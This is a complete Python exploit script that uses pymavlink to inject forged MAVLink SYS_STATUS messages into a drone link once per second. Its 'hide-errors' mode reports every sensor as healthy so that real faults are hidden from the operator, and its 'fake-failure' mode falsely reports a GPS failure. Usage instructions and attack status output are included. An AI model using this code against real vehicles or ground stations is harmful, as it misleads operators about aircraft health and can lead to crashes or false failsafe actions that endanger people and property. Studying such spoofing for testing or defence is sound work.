#!/usr/bin/env python3
"""
System Status Spoofing Exploit Script
Manipulates system status messages to hide errors or mislead operator
"""

import sys
import time
from pymavlink import mavutil

def inject_system_status(connection, sensors_present=None, sensors_enabled=None,
                        sensors_health=None, load=None, voltage_battery=None,
                        current_battery=None, battery_remaining=None,
                        drop_rate_comm=None, errors_comm=None, errors_count1=None,
                        errors_count2=None, errors_count3=None, errors_count4=None):
    """
    Inject spoofed SYS_STATUS message
    
    Args:
        connection: MAVLink connection object
        sensors_present: Bitmask of present sensors
        sensors_enabled: Bitmask of enabled sensors
        sensors_health: Bitmask of healthy sensors
        load: System load percentage (0-100)
        voltage_battery: Battery voltage in mV
        current_battery: Battery current in cA
        battery_remaining: Battery remaining percentage (-1 = unknown)
        drop_rate_comm: Communication drop rate
        errors_comm: Communication errors
        errors_count1-4: Error counts
    """
    target_system = connection.target_system
    target_component = connection.target_component
    
    # Default values - all systems healthy
    if sensors_present is None:
        sensors_present = 0xFFFFFFFF  # All sensors present
    if sensors_enabled is None:
        sensors_enabled = 0xFFFFFFFF  # All sensors enabled
    if sensors_health is None:
        sensors_health = 0xFFFFFFFF  # All sensors healthy
    if load is None:
        load = 0  # No load
    if voltage_battery is None:
        voltage_battery = 12600  # 12.6V in mV
    if current_battery is None:
        current_battery = -1  # Unknown
    if battery_remaining is None:
        battery_remaining = -1  # Unknown
    if drop_rate_comm is None:
        drop_rate_comm = 0  # No drops
    if errors_comm is None:
        errors_comm = 0  # No errors
    if errors_count1 is None:
        errors_count1 = 0
    if errors_count2 is None:
        errors_count2 = 0
    if errors_count3 is None:
        errors_count3 = 0
    if errors_count4 is None:
        errors_count4 = 0
    
    print(f"[*] Injecting system status spoof:")
    print(f"    Sensors Present: 0x{sensors_present:08X}")
    print(f"    Sensors Enabled: 0x{sensors_enabled:08X}")
    print(f"    Sensors Health: 0x{sensors_health:08X}")
    print(f"    Load: {load}%")
    print(f"    Battery Voltage: {voltage_battery} mV")
    print(f"    Battery Current: {current_battery} cA")
    print(f"    Battery Remaining: {battery_remaining}%")
    
    # Send SYS_STATUS message
    connection.mav.sys_status_send(
        sensors_present,
        sensors_enabled,
        sensors_health,
        load,
        voltage_battery,
        current_battery,
        battery_remaining,
        drop_rate_comm,
        errors_comm,
        errors_count1,
        errors_count2,
        errors_count3,
        errors_count4
    )
    
    print("[+] System status spoof injected")

def hide_sensor_errors(connection):
    """Hide sensor errors by reporting all sensors as healthy"""
    print("[*] Hiding sensor errors...")
    inject_system_status(
        connection,
        sensors_present=0xFFFFFFFF,
        sensors_enabled=0xFFFFFFFF,
        sensors_health=0xFFFFFFFF  # All healthy
    )

def fake_sensor_failure(connection, sensor_mask):
    """Fake sensor failure by reporting specific sensors as unhealthy"""
    print(f"[*] Faking sensor failure (mask: 0x{sensor_mask:08X})...")
    inject_system_status(
        connection,
        sensors_present=0xFFFFFFFF,
        sensors_enabled=0xFFFFFFFF,
        sensors_health=0xFFFFFFFF & ~sensor_mask  # Mask out failed sensors
    )

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 system_status_spoofing.py <connection> [action]")
        print("\nArguments:")
        print("  connection    MAVLink connection string (e.g., udp:127.0.0.1:14550)")
        print("  action        Action to perform:")
        print("                hide-errors    Hide all sensor errors")
        print("                fake-failure   Fake sensor failure")
        print("                custom         Use custom values (see code)")
        print("\nExamples:")
        print("  python3 system_status_spoofing.py udp:127.0.0.1:14550 hide-errors")
        print("  python3 system_status_spoofing.py udp:127.0.0.1:14550 fake-failure")
        sys.exit(1)
    
    connection_string = sys.argv[1]
    action = sys.argv[2] if len(sys.argv) > 2 else 'hide-errors'
    
    print(f"[*] Connecting to {connection_string}...")
    try:
        connection = mavutil.mavlink_connection(connection_string)
        connection.wait_heartbeat(timeout=5)
        print("[+] Connected to vehicle")
    except Exception as e:
        print(f"[-] Failed to connect: {e}")
        sys.exit(1)
    
    # Perform action
    print("[*] Injecting system status spoof (Press Ctrl+C to stop)...")
    try:
        while True:
            if action == 'hide-errors':
                hide_sensor_errors(connection)
            elif action == 'fake-failure':
                # Fake GPS failure (sensor ID 1)
                fake_sensor_failure(connection, 0x00000001)
            else:
                # Default: hide errors
                hide_sensor_errors(connection)
            time.sleep(1)  # Send every second
    except KeyboardInterrupt:
        print("\n[*] Stopping system status spoofing...")

if __name__ == "__main__":
    main()
